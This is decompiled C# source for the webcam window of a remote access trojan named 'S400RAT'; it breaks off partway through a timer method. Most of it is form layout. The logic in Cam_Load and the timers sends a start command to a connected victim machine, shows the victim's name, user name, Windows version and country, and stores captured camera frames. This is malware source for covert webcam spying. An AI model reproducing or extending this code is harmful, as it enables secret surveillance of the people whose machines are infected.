using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Guna.UI2.WinForms.Enums;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using S400RAT.My.Resources;
using SQLABC_ModernUI;

namespace S400RAT;

[DesignerGenerated]
public class Cam : Form
{
	public IContainer icontainer_0;

	[AccessedThroughProperty("PictureBox1")]
	[CompilerGenerated]
	public PictureBox pictureBox_0;

	[CompilerGenerated]
	[AccessedThroughProperty("vmethod_6")]
	public Timer timer_0;

	[CompilerGenerated]
	[AccessedThroughProperty("Timer1")]
	public Timer timer_1;

	[AccessedThroughProperty("Guna2AnimateWindow1")]
	[CompilerGenerated]
	public Guna2AnimateWindow guna2AnimateWindow_0;

	[CompilerGenerated]
	[AccessedThroughProperty("Guna2BorderlessForm1")]
	public Guna2BorderlessForm guna2BorderlessForm_0;

	[CompilerGenerated]
	[AccessedThroughProperty("Guna2ControlBox1")]
	public Guna2ControlBox guna2ControlBox_0;

	[CompilerGenerated]
	[AccessedThroughProperty("ProgressBar1")]
	public Guna2CircleProgressBar guna2CircleProgressBar_0;

	[AccessedThroughProperty("VL")]
	[CompilerGenerated]
	public Label label_0;

	[CompilerGenerated]
	[AccessedThroughProperty("ComboBox2")]
	public Guna2ComboBox guna2ComboBox_0;

	[AccessedThroughProperty("ComboBox1")]
	[CompilerGenerated]
	public Guna2ComboBox guna2ComboBox_1;

	[CompilerGenerated]
	[AccessedThroughProperty("Button1")]
	public Guna2GradientButton guna2GradientButton_0;

	[CompilerGenerated]
	[AccessedThroughProperty("CheckBox3")]
	public Guna2CheckBox guna2CheckBox_0;

	[CompilerGenerated]
	[AccessedThroughProperty("panel1")]
	public Panel panel_0;

	[CompilerGenerated]
	[AccessedThroughProperty("panel2")]
	public Panel panel_1;

	[AccessedThroughProperty("PictureBox2")]
	[CompilerGenerated]
	public PictureBox pictureBox_1;

	[CompilerGenerated]
	[AccessedThroughProperty("Guna2ShadowPanel1")]
	public Guna2ShadowPanel guna2ShadowPanel_0;

	[CompilerGenerated]
	[AccessedThroughProperty("panel5")]
	public Panel panel_2;

	[CompilerGenerated]
	[AccessedThroughProperty("ADD")]
	public Label label_1;

	[AccessedThroughProperty("WindowsWindows10ToolStripMenuItem")]
	[CompilerGenerated]
	public Label label_2;

	[CompilerGenerated]
	[AccessedThroughProperty("UserNameFCToolStripMenuItem")]
	public Label label_3;

	[CompilerGenerated]
	[AccessedThroughProperty("Namevctim")]
	public Label label_4;

	[CompilerGenerated]
	[AccessedThroughProperty("Label10")]
	public Label label_5;

	[CompilerGenerated]
	[AccessedThroughProperty("Label7")]
	public Label label_6;

	[CompilerGenerated]
	[AccessedThroughProperty("Label5")]
	public Label label_7;

	[CompilerGenerated]
	[AccessedThroughProperty("pictureBox3")]
	public PictureBox pictureBox_2;

	[CompilerGenerated]
	[AccessedThroughProperty("label8")]
	public Label label_8;

	[AccessedThroughProperty("label9")]
	[CompilerGenerated]
	public Label label_9;

	[AccessedThroughProperty("PictureBox4")]
	[CompilerGenerated]
	public PictureBox pictureBox_3;

	[AccessedThroughProperty("SqlabC_ControlMini1")]
	[CompilerGenerated]
	public SQLABC_ControlMini sqlabc_ControlMini_0;

	public string folder;

	public int fps;

	public int int_0;

	public Client osk;

	public int pkt;

	public Client sk;

	internal virtual PictureBox PictureBox1
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_0;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_7;
			PictureBox pictureBox = pictureBox_0;
			if (pictureBox != null)
			{
				pictureBox.Click -= value2;
			}
			pictureBox_0 = value;
			pictureBox = pictureBox_0;
			if (pictureBox != null)
			{
				pictureBox.Click += value2;
			}
		}
	}

	internal virtual Guna2ControlBox Guna2ControlBox1
	{
		[CompilerGenerated]
		get
		{
			return guna2ControlBox_0;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_9;
			Guna2ControlBox guna2ControlBox = guna2ControlBox_0;
			if (guna2ControlBox != null)
			{
				guna2ControlBox.Click -= value2;
			}
			guna2ControlBox_0 = value;
			guna2ControlBox = guna2ControlBox_0;
			if (guna2ControlBox != null)
			{
				guna2ControlBox.Click += value2;
			}
		}
	}

	internal virtual Guna2CircleProgressBar ProgressBar1
	{
		[CompilerGenerated]
		get
		{
			return guna2CircleProgressBar_0;
		}
		[CompilerGenerated]
		set
		{
			guna2CircleProgressBar_0 = value;
		}
	}

	internal virtual Label VL
	{
		[CompilerGenerated]
		get
		{
			return label_0;
		}
		[CompilerGenerated]
		set
		{
			label_0 = value;
		}
	}

	internal virtual Guna2ComboBox ComboBox2
	{
		[CompilerGenerated]
		get
		{
			return guna2ComboBox_0;
		}
		[CompilerGenerated]
		set
		{
			guna2ComboBox_0 = value;
		}
	}

	internal virtual Guna2ComboBox ComboBox1
	{
		[CompilerGenerated]
		get
		{
			return guna2ComboBox_1;
		}
		[CompilerGenerated]
		set
		{
			guna2ComboBox_1 = value;
		}
	}

	internal virtual Guna2GradientButton Button1
	{
		[CompilerGenerated]
		get
		{
			return guna2GradientButton_0;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_6;
			Guna2GradientButton guna2GradientButton = guna2GradientButton_0;
			if (guna2GradientButton != null)
			{
				guna2GradientButton.Click -= value2;
			}
			guna2GradientButton_0 = value;
			guna2GradientButton = guna2GradientButton_0;
			if (guna2GradientButton != null)
			{
				guna2GradientButton.Click += value2;
			}
		}
	}

	internal virtual Guna2CheckBox CheckBox3
	{
		[CompilerGenerated]
		get
		{
			return guna2CheckBox_0;
		}
		[CompilerGenerated]
		set
		{
			guna2CheckBox_0 = value;
		}
	}

	public virtual Panel panel1
	{
		[CompilerGenerated]
		get
		{
			return panel_0;
		}
		[CompilerGenerated]
		set
		{
			panel_0 = value;
		}
	}

	public virtual Panel panel2
	{
		[CompilerGenerated]
		get
		{
			return panel_1;
		}
		[CompilerGenerated]
		set
		{
			panel_1 = value;
		}
	}

	public virtual PictureBox PictureBox2
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_1;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_1 = value;
		}
	}

	internal virtual Guna2ShadowPanel Guna2ShadowPanel1
	{
		[CompilerGenerated]
		get
		{
			return guna2ShadowPanel_0;
		}
		[CompilerGenerated]
		set
		{
			guna2ShadowPanel_0 = value;
		}
	}

	public virtual Panel panel5
	{
		[CompilerGenerated]
		get
		{
			return panel_2;
		}
		[CompilerGenerated]
		set
		{
			panel_2 = value;
		}
	}

	public virtual Label ADD
	{
		[CompilerGenerated]
		get
		{
			return label_1;
		}
		[CompilerGenerated]
		set
		{
			label_1 = value;
		}
	}

	public virtual Label WindowsWindows10ToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return label_2;
		}
		[CompilerGenerated]
		set
		{
			label_2 = value;
		}
	}

	public virtual Label UserNameFCToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return label_3;
		}
		[CompilerGenerated]
		set
		{
			label_3 = value;
		}
	}

	public virtual Label Namevctim
	{
		[CompilerGenerated]
		get
		{
			return label_4;
		}
		[CompilerGenerated]
		set
		{
			label_4 = value;
		}
	}

	public virtual Label Label10
	{
		[CompilerGenerated]
		get
		{
			return label_5;
		}
		[CompilerGenerated]
		set
		{
			label_5 = value;
		}
	}

	public virtual Label Label7
	{
		[CompilerGenerated]
		get
		{
			return label_6;
		}
		[CompilerGenerated]
		set
		{
			label_6 = value;
		}
	}

	public virtual Label Label5
	{
		[CompilerGenerated]
		get
		{
			return label_7;
		}
		[CompilerGenerated]
		set
		{
			label_7 = value;
		}
	}

	public virtual PictureBox pictureBox3
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_2;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_2 = value;
		}
	}

	public virtual Label label8
	{
		[CompilerGenerated]
		get
		{
			return label_8;
		}
		[CompilerGenerated]
		set
		{
			label_8 = value;
		}
	}

	public virtual Label label9
	{
		[CompilerGenerated]
		get
		{
			return label_9;
		}
		[CompilerGenerated]
		set
		{
			label_9 = value;
		}
	}

	internal virtual PictureBox PictureBox4
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_3;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_3 = value;
		}
	}

	internal virtual SQLABC_ControlMini SqlabC_ControlMini1
	{
		[CompilerGenerated]
		get
		{
			return sqlabc_ControlMini_0;
		}
		[CompilerGenerated]
		set
		{
			sqlabc_ControlMini_0 = value;
		}
	}

	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	public void method_0()
	{
		icontainer_0 = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Cam));
		PictureBox1 = new PictureBox();
		vmethod_1(new Timer(icontainer_0));
		vmethod_3(new Timer(icontainer_0));
		vmethod_5(new Guna2AnimateWindow(icontainer_0));
		vmethod_7(new Guna2BorderlessForm(icontainer_0));
		Guna2ControlBox1 = new Guna2ControlBox();
		ProgressBar1 = new Guna2CircleProgressBar();
		VL = new Label();
		ComboBox2 = new Guna2ComboBox();
		ComboBox1 = new Guna2ComboBox();
		CheckBox3 = new Guna2CheckBox();
		Button1 = new Guna2GradientButton();
		panel1 = new Panel();
		panel2 = new Panel();
		PictureBox4 = new PictureBox();
		PictureBox2 = new PictureBox();
		Guna2ShadowPanel1 = new Guna2ShadowPanel();
		panel5 = new Panel();
		ADD = new Label();
		WindowsWindows10ToolStripMenuItem = new Label();
		UserNameFCToolStripMenuItem = new Label();
		Namevctim = new Label();
		Label10 = new Label();
		Label7 = new Label();
		Label5 = new Label();
		pictureBox3 = new PictureBox();
		label8 = new Label();
		label9 = new Label();
		SqlabC_ControlMini1 = new SQLABC_ControlMini();
		((ISupportInitialize)PictureBox1).BeginInit();
		ProgressBar1.SuspendLayout();
		panel1.SuspendLayout();
		panel2.SuspendLayout();
		((ISupportInitialize)PictureBox4).BeginInit();
		((ISupportInitialize)PictureBox2).BeginInit();
		Guna2ShadowPanel1.SuspendLayout();
		panel5.SuspendLayout();
		((ISupportInitialize)pictureBox3).BeginInit();
		SuspendLayout();
		PictureBox1.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
		PictureBox1.BackColor = Color.FromArgb(46, 51, 73);
		PictureBox1.Location = new Point(3, 3);
		PictureBox1.Name = "PictureBox1";
		PictureBox1.Size = new Size(538, 329);
		PictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
		PictureBox1.TabIndex = 1;
		PictureBox1.TabStop = false;
		vmethod_2().Enabled = true;
		vmethod_4().AnimationType = Guna2AnimateWindow.AnimateWindowType.AW_BLEND;
		vmethod_4().TargetForm = this;
		vmethod_6().ContainerControl = this;
		Guna2ControlBox1.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		Guna2ControlBox1.BackColor = Color.Transparent;
		Guna2ControlBox1.BorderColor = Color.Transparent;
		Guna2ControlBox1.FillColor = Color.FromArgb(24, 30, 54);
		Guna2ControlBox1.HoverState.Parent = Guna2ControlBox1;
		Guna2ControlBox1.IconColor = Color.White;
		Guna2ControlBox1.Location = new Point(704, 0);
		Guna2ControlBox1.Name = "Guna2ControlBox1";
		Guna2ControlBox1.PressedColor = Color.FromArgb(24, 30, 54);
		Guna2ControlBox1.ShadowDecoration.Parent = Guna2ControlBox1;
		Guna2ControlBox1.Size = new Size(45, 29);
		Guna2ControlBox1.TabIndex = 68;
		ProgressBar1.Controls.Add(VL);
		ProgressBar1.FillColor = Color.FromArgb(46, 51, 73);
		ProgressBar1.FillThickness = 10;
		ProgressBar1.Location = new Point(28, 152);
		ProgressBar1.Name = "ProgressBar1";
		ProgressBar1.ProgressColor = Color.FromArgb(84, 131, 255);
		ProgressBar1.ProgressColor2 = Color.FromArgb(0, 126, 249);
		ProgressBar1.ProgressThickness = 10;
		ProgressBar1.ShadowDecoration.Mode = ShadowMode.Circle;
		ProgressBar1.ShadowDecoration.Parent = ProgressBar1;
		ProgressBar1.Size = new Size(126, 121);
		ProgressBar1.TabIndex = 69;
		VL.AutoSize = true;
		VL.Font = new Font("Segoe UI", 10f, FontStyle.Bold);
		VL.ForeColor = Color.FromArgb(84, 131, 255);
		VL.Location = new Point(36, 49);
		VL.Name = "VL";
		VL.Size = new Size(17, 19);
		VL.TabIndex = 65;
		VL.Text = "0";
		ComboBox2.Animated = true;
		ComboBox2.AutoRoundedCorners = true;
		ComboBox2.BackColor = Color.FromArgb(0, 192, 192);
		ComboBox2.BorderColor = Color.FromArgb(0, 126, 249);
		ComboBox2.BorderRadius = 17;
		ComboBox2.DrawMode = DrawMode.OwnerDrawFixed;
		ComboBox2.DropDownStyle = ComboBoxStyle.DropDownList;
		ComboBox2.FillColor = Color.FromArgb(24, 30, 54);
		ComboBox2.FocusedColor = Color.FromArgb(94, 148, 255);
		ComboBox2.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
		ComboBox2.FocusedState.Parent = ComboBox2;
		ComboBox2.Font = new Font("Segoe UI", 9f);
		ComboBox2.ForeColor = Color.FromArgb(224, 224, 224);
		ComboBox2.HoverState.Parent = ComboBox2;
		ComboBox2.ItemHeight = 30;
		ComboBox2.Items.AddRange(new object[6] { "%100", "%90", "%80", "%70", "%60", "%50" });
		ComboBox2.ItemsAppearance.Parent = ComboBox2;
		ComboBox2.Location = new Point(8, 339);
		ComboBox2.Name = "ComboBox2";
		ComboBox2.ShadowDecoration.Parent = ComboBox2;
		ComboBox2.Size = new Size(171, 36);
		ComboBox2.Style = TextBoxStyle.Material;
		ComboBox2.TabIndex = 70;
		ComboBox1.Animated = true;
		ComboBox1.AutoRoundedCorners = true;
		ComboBox1.BackColor = Color.FromArgb(0, 192, 192);
		ComboBox1.BorderColor = Color.FromArgb(0, 126, 249);
		ComboBox1.BorderRadius = 17;
		ComboBox1.DrawMode = DrawMode.OwnerDrawFixed;
		ComboBox1.DropDownStyle = ComboBoxStyle.DropDownList;
		ComboBox1.FillColor = Color.FromArgb(24, 30, 54);
		ComboBox1.FocusedColor = Color.FromArgb(94, 148, 255);
		ComboBox1.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
		ComboBox1.FocusedState.Parent = ComboBox1;
		ComboBox1.Font = new Font("Segoe UI", 9f);
		ComboBox1.ForeColor = Color.FromArgb(224, 224, 224);
		ComboBox1.HoverState.Parent = ComboBox1;
		ComboBox1.ItemHeight = 30;
		ComboBox1.ItemsAppearance.Parent = ComboBox1;
		ComboBox1.Location = new Point(8, 287);
		ComboBox1.Name = "ComboBox1";
		ComboBox1.ShadowDecoration.Parent = ComboBox1;
		ComboBox1.Size = new Size(171, 36);
		ComboBox1.Style = TextBoxStyle.Material;
		ComboBox1.TabIndex = 71;
		CheckBox3.AutoSize = true;
		CheckBox3.BackColor = Color.FromArgb(24, 30, 54);
		CheckBox3.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		CheckBox3.CheckedState.BorderRadius = 20;
		CheckBox3.CheckedState.BorderThickness = 2;
		CheckBox3.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		CheckBox3.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		CheckBox3.Location = new Point(8, 387);
		CheckBox3.Name = "CheckBox3";
		CheckBox3.Size = new Size(80, 19);
		CheckBox3.TabIndex = 75;
		CheckBox3.Text = "Auto Save";
		CheckBox3.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		CheckBox3.UncheckedState.BorderRadius = 0;
		CheckBox3.UncheckedState.BorderThickness = 0;
		CheckBox3.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		CheckBox3.UseVisualStyleBackColor = false;
		Button1.Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
		Button1.Animated = true;
		Button1.AutoRoundedCorners = true;
		Button1.BackColor = Color.Transparent;
		Button1.BorderRadius = 31;
		Button1.CheckedState.Parent = Button1;
		Button1.CustomImages.Parent = Button1;
		Button1.FillColor = Color.FromArgb(46, 51, 73);
		Button1.FillColor2 = Color.FromArgb(46, 51, 73);
		Button1.Font = new Font("Segoe UI", 9f);
		Button1.ForeColor = Color.White;
		Button1.HoverState.Parent = Button1;
		Button1.IndicateFocus = true;
		Button1.Location = new Point(8, 412);
		Button1.Name = "Button1";
		Button1.ShadowDecoration.Parent = Button1;
		Button1.Size = new Size(171, 65);
		Button1.TabIndex = 76;
		Button1.Text = "Start";
		Button1.UseTransparentBackground = true;
		panel1.BackColor = Color.FromArgb(24, 30, 54);
		panel1.Controls.Add(panel2);
		panel1.Controls.Add(Button1);
		panel1.Controls.Add(ComboBox1);
		panel1.Controls.Add(CheckBox3);
		panel1.Controls.Add(ProgressBar1);
		panel1.Controls.Add(ComboBox2);
		panel1.Dock = DockStyle.Left;
		panel1.Location = new Point(0, 0);
		panel1.Name = "panel1";
		panel1.Size = new Size(186, 483);
		panel1.TabIndex = 77;
		panel2.Controls.Add(PictureBox4);
		panel2.Controls.Add(PictureBox2);
		panel2.Dock = DockStyle.Top;
		panel2.Location = new Point(0, 0);
		panel2.Name = "panel2";
		panel2.Size = new Size(186, 131);
		panel2.TabIndex = 0;
		PictureBox4.Image = Resources.Capture;
		PictureBox4.Location = new Point(8, 78);
		PictureBox4.Name = "PictureBox4";
		PictureBox4.Size = new Size(175, 47);
		PictureBox4.SizeMode = PictureBoxSizeMode.StretchImage;
		PictureBox4.TabIndex = 2;
		PictureBox4.TabStop = false;
		PictureBox2.Image = (Image)componentResourceManager.GetObject("PictureBox2.Image");
		PictureBox2.Location = new Point(59, 9);
		PictureBox2.Name = "PictureBox2";
		PictureBox2.Size = new Size(63, 63);
		PictureBox2.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox2.TabIndex = 0;
		PictureBox2.TabStop = false;
		Guna2ShadowPanel1.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
		Guna2ShadowPanel1.BackColor = Color.FromArgb(46, 51, 73);
		Guna2ShadowPanel1.Controls.Add(PictureBox1);
		Guna2ShadowPanel1.FillColor = Color.Black;
		Guna2ShadowPanel1.Location = new Point(192, 136);
		Guna2ShadowPanel1.Name = "Guna2ShadowPanel1";
		Guna2ShadowPanel1.ShadowColor = Color.Black;
		Guna2ShadowPanel1.Size = new Size(544, 335);
		Guna2ShadowPanel1.TabIndex = 86;
		panel5.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
		panel5.BackColor = Color.FromArgb(37, 42, 64);
		panel5.Controls.Add(ADD);
		panel5.Controls.Add(WindowsWindows10ToolStripMenuItem);
		panel5.Controls.Add(UserNameFCToolStripMenuItem);
		panel5.Controls.Add(Namevctim);
		panel5.Controls.Add(Label10);
		panel5.Controls.Add(Label7);
		panel5.Controls.Add(Label5);
		panel5.Controls.Add(pictureBox3);
		panel5.Controls.Add(label8);
		panel5.Controls.Add(label9);
		panel5.Location = new Point(192, 0);
		panel5.Name = "panel5";
		panel5.Size = new Size(329, 130);
		panel5.TabIndex = 88;
		ADD.AutoSize = true;
		ADD.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		ADD.ForeColor = Color.FromArgb(158, 161, 176);
		ADD.Location = new Point(98, 102);
		ADD.Name = "ADD";
		ADD.Size = new Size(18, 17);
		ADD.TabIndex = 9;
		ADD.Text = "--";
		WindowsWindows10ToolStripMenuItem.AutoSize = true;
		WindowsWindows10ToolStripMenuItem.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		WindowsWindows10ToolStripMenuItem.ForeColor = Color.FromArgb(158, 161, 176);
		WindowsWindows10ToolStripMenuItem.Location = new Point(98, 81);
		WindowsWindows10ToolStripMenuItem.Name = "WindowsWindows10ToolStripMenuItem";
		WindowsWindows10ToolStripMenuItem.Size = new Size(18, 17);
		WindowsWindows10ToolStripMenuItem.TabIndex = 8;
		WindowsWindows10ToolStripMenuItem.Text = "--";
		UserNameFCToolStripMenuItem.AutoSize = true;
		UserNameFCToolStripMenuItem.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		UserNameFCToolStripMenuItem.ForeColor = Color.FromArgb(158, 161, 176);
		UserNameFCToolStripMenuItem.Location = new Point(98, 60);
		UserNameFCToolStripMenuItem.Name = "UserNameFCToolStripMenuItem";
		UserNameFCToolStripMenuItem.Size = new Size(18, 17);
		UserNameFCToolStripMenuItem.TabIndex = 7;
		UserNameFCToolStripMenuItem.Text = "--";
		Namevctim.AutoSize = true;
		Namevctim.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Namevctim.ForeColor = Color.FromArgb(158, 161, 176);
		Namevctim.Location = new Point(98, 39);
		Namevctim.Name = "Namevctim";
		Namevctim.Size = new Size(18, 17);
		Namevctim.TabIndex = 6;
		Namevctim.Text = "--";
		Label10.AutoSize = true;
		Label10.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label10.ForeColor = Color.FromArgb(158, 161, 176);
		Label10.Location = new Point(30, 102);
		Label10.Name = "Label10";
		Label10.Size = new Size(61, 17);
		Label10.TabIndex = 5;
		Label10.Text = "Country :";
		Label7.AutoSize = true;
		Label7.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label7.ForeColor = Color.FromArgb(158, 161, 176);
		Label7.Location = new Point(23, 81);
		Label7.Name = "Label7";
		Label7.Size = new Size(68, 17);
		Label7.TabIndex = 4;
		Label7.Text = "Windows :";
		Label5.AutoSize = true;
		Label5.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label5.ForeColor = Color.FromArgb(158, 161, 176);
		Label5.Location = new Point(10, 60);
		Label5.Name = "Label5";
		Label5.Size = new Size(81, 17);
		Label5.TabIndex = 3;
		Label5.Text = "User Name :";
		pictureBox3.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		pictureBox3.Image = (Image)componentResourceManager.GetObject("pictureBox3.Image");
		pictureBox3.Location = new Point(265, 19);
		pictureBox3.Name = "pictureBox3";
		pictureBox3.Size = new Size(53, 58);
		pictureBox3.SizeMode = PictureBoxSizeMode.Zoom;
		pictureBox3.TabIndex = 2;
		pictureBox3.TabStop = false;
		label8.AutoSize = true;
		label8.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		label8.ForeColor = Color.FromArgb(158, 161, 176);
		label8.Location = new Point(41, 39);
		label8.Name = "label8";
		label8.Size = new Size(50, 17);
		label8.TabIndex = 0;
		label8.Text = "Name :";
		label9.AutoSize = true;
		label9.Font = new Font("Nirmala UI", 14.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
		label9.ForeColor = Color.FromArgb(84, 131, 255);
		label9.Location = new Point(17, 9);
		label9.Name = "label9";
		label9.Size = new Size(111, 25);
		label9.TabIndex = 0;
		label9.Text = "Information";
		SqlabC_ControlMini1.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		SqlabC_ControlMini1.BackColor = Color.White;
		SqlabC_ControlMini1.BaseColor = Color.FromArgb(24, 30, 54);
		SqlabC_ControlMini1.Font = new Font("Marlett", 12f);
		SqlabC_ControlMini1.Location = new Point(680, 6);
		SqlabC_ControlMini1.Name = "SqlabC_ControlMini1";
		SqlabC_ControlMini1.Size = new Size(18, 18);
		SqlabC_ControlMini1.TabIndex = 132;
		SqlabC_ControlMini1.Text = "SqlabC_ControlMini1";
		SqlabC_ControlMini1.TextColor = Color.FromArgb(243, 243, 243);
		base.AutoScaleDimensions = new SizeF(6f, 13f);
		base.AutoScaleMode = AutoScaleMode.Font;
		BackColor = Color.FromArgb(24, 30, 54);
		base.ClientSize = new Size(748, 483);
		base.Controls.Add(SqlabC_ControlMini1);
		base.Controls.Add(panel5);
		base.Controls.Add(Guna2ShadowPanel1);
		base.Controls.Add(panel1);
		base.Controls.Add(Guna2ControlBox1);
		ForeColor = Color.FromArgb(224, 224, 224);
		base.FormBorderStyle = FormBorderStyle.None;
		base.Name = "Cam";
		base.StartPosition = FormStartPosition.CenterScreen;
		Text = "Cam";
		((ISupportInitialize)PictureBox1).EndInit();
		ProgressBar1.ResumeLayout(performLayout: false);
		ProgressBar1.PerformLayout();
		panel1.ResumeLayout(performLayout: false);
		panel1.PerformLayout();
		panel2.ResumeLayout(performLayout: false);
		((ISupportInitialize)PictureBox4).EndInit();
		((ISupportInitialize)PictureBox2).EndInit();
		Guna2ShadowPanel1.ResumeLayout(performLayout: false);
		panel5.ResumeLayout(performLayout: false);
		panel5.PerformLayout();
		((ISupportInitialize)pictureBox3).EndInit();
		ResumeLayout(performLayout: false);
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual Timer vmethod_0()
	{
		return timer_0;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_1(Timer WithEventsValue)
	{
		EventHandler value = method_1;
		Timer timer = timer_0;
		if (timer != null)
		{
			timer.Tick -= value;
		}
		timer_0 = WithEventsValue;
		timer = timer_0;
		if (timer != null)
		{
			timer.Tick += value;
		}
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual Timer vmethod_2()
	{
		return timer_1;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_3(Timer WithEventsValue)
	{
		EventHandler value = method_5;
		Timer timer = timer_1;
		if (timer != null)
		{
			timer.Tick -= value;
		}
		timer_1 = WithEventsValue;
		timer = timer_1;
		if (timer != null)
		{
			timer.Tick += value;
		}
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual Guna2AnimateWindow vmethod_4()
	{
		return guna2AnimateWindow_0;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_5(Guna2AnimateWindow WithEventsValue)
	{
		guna2AnimateWindow_0 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual Guna2BorderlessForm vmethod_6()
	{
		return guna2BorderlessForm_0;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_7(Guna2BorderlessForm WithEventsValue)
	{
		guna2BorderlessForm_0 = WithEventsValue;
	}

	public Cam()
	{
		base.Load += Cam_Load;
		fps = 0;
		int_0 = 0;
		folder = string.Empty;
		method_0();
	}

	public void Cam_Load(object sender, EventArgs e)
	{
		try
		{
			ComboBox2.SelectedIndex = 3;
			vmethod_0().Enabled = true;
			folder = osk.Folder + "Cam\\";
			if (!Directory.Exists(folder))
			{
				Directory.CreateDirectory(folder);
			}
			try
			{
				ComboBox2.SelectedIndex = Class7.class8_0.int_0;
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception projectError = ex;
				ProjectData.SetProjectError(projectError);
				ComboBox2.SelectedIndex = 3;
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
			if (Class7.class8_0.bool_6)
			{
				Button1.Text = "Stop";
				sk.Send("!" + Class7.string_1 + Conversions.ToString(ComboBox1.SelectedIndex) + Class7.string_1 + ComboBox2.Text);
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			Close();
			ProjectData.ClearProjectError();
		}
		try
		{
			string expression = Conversions.ToString(RuntimeHelpers.GetObjectValue(Class7.gsciXiVbtJ(osk.L)));
			string[] array = Strings.Split(expression, "|'|");
			Namevctim.Text = array[1];
			UserNameFCToolStripMenuItem.Text = array[2];
			WindowsWindows10ToolStripMenuItem.Text = array[3];
			ADD.Text = array[4];
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	public void method_1(object sender, EventArgs e)
	{
		vmethod_0().Enabled = false;
		try
		{
			if ((osk == null) | (sk == null))
			{
				Close();
				return;
			}
			if (!osk.CN | !sk.CN)
			{
				Close();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		int_0 = fps;
		if (int_0 == 0)
		{
			pkt = 0;
			PictureBox1.Invalidate();
		}
		fps = 0;
		vmethod_0().Enabled = true;
	}

	public void method_2(object sender, EventArgs e)
	{
		if (CheckBox3.Checked)
		{
			try
			{
				Process.Start(folder);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void method_3(object sender, EventArgs e)
	{
		if (Operators.CompareString(Button1.Text, "Stop", TextCompare: false) == 0)
		{
			NewLateBinding.LateCall(sk, null, "Send", new object[1] { Operators.ConcatenateObject("!" + Class7.string_1 + Conversions.ToString(ComboBox1.SelectedIndex) + Class7.string_1, RuntimeHelpers.GetObjectValue(ComboBox2.SelectedItem)) }, null, null, null, IgnoreReturn: true);
		}
	}

	public void method_4(object sender, EventArgs e)
	{
		if (Operators.CompareString(Button1.Text, "Stop", TextCompare: false) == 0)
		{
			NewLateBinding.LateCall(sk, null, "Send", new object[1] { Operators.ConcatenateObject("!" + Class7.string_1 + Conversions.ToString(ComboBox1.SelectedIndex) + Class7.string_1, RuntimeHelpers.GetObjectValue(ComboBox2.SelectedItem)) }, null, null, null, IgnoreReturn: true);
		}
	}

	public void method_5(object sender, EventArgs e)
	{
		try
		{
			ProgressBar1.Value = Conversions.ToInteger(Conversions.ToString(int_0));
			VL.Text = Class6.smethod_10(pkt);
			if (int_0 > 3)
			{
				VL.ForeColor = Color.YellowGreen;
			}
			if (int_0 > 6)
			{
				VL.ForeColor = Color.LimeGreen;
			}
		}
		catch (Exception projectError)
